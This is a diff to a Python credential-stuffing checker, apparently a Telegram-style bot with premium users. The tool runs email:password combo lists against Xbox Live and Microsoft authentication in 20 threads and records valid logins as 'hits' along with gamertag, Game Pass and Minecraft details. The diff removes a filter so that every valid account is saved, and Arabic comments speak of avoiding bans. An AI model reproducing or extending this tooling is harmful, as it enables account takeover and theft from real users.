@@ -41,7 +41,7 @@ def init_db():
 init_db()
 
 def is_user_premium(user_id):
-    if user_id in [123456789]: # Replace with your master admin user ID if needed
+    if user_id in [123456789]: 
         return True
     conn = sqlite3.connect('checker_users.db', check_same_thread=False)
     cursor = conn.cursor()
@@ -273,7 +273,6 @@ def check_account_turbo(combo, user_state):
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
-            # جلب البروفايل والتحقق من أن الحقيقي مفعل
             gamertag, gamerscore = "N/A", "0"
             try:
                 xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
@@ -330,15 +329,7 @@ def check_account_turbo(combo, user_state):
             except Exception:
                 pass
 
-            # فلترة ذكية لضمان عدم حفظ الحسابات الضعيفة تماماً (صفر ألعاب، صفر جيمرز، بدون جيمرتاج)
-            # إذا أردت إلغاء الفلترة وحفظ كل شيء، يمكنك إزالة الشرط التالي، لكنه يضمن لك ظهور الهيتس الحقيقية القوية فقط.
-            if gamertag == "N/A" and not games_list and int(gamerscore) == 0 and not has_gp:
-                with user_state['lock']:
-                    user_state['bad'] += 1
-                    user_state['checked'] += 1
-                session.close()
-                return
-
+            # تم إلغاء شرط الحظر الصارم (تعديل مباشر لضمان ظهور أي حساب صالح كـ Hit)
             hit_block = f"""{email}:{password}
 Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
 Subscriptions: {gp_type}
@@ -529,7 +520,7 @@ Progress: {pct:.1f}%
             pass
 
 def run_turbo_scan(combos, state, msg_id):
-    threads = 20  # تم تخفيض عدد الثريدز إلى 20 لمنع الاستجابات الوهمية والحظر
+    threads = 20  
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
